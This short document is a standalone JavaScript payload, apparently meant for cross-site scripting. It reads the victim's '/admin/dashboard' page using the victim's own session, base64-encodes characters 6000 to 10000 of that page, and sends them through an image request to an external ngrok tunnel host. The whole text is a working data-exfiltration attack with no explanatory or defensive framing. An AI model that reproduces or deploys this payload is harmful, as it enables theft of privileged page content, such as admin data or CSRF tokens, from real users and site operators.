fetch("/admin/dashboard")
.then(r=>r.text())
.then(d=>{
new Image().src="https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app?p=1&d="+btoa(d.slice(6000,10000))
})
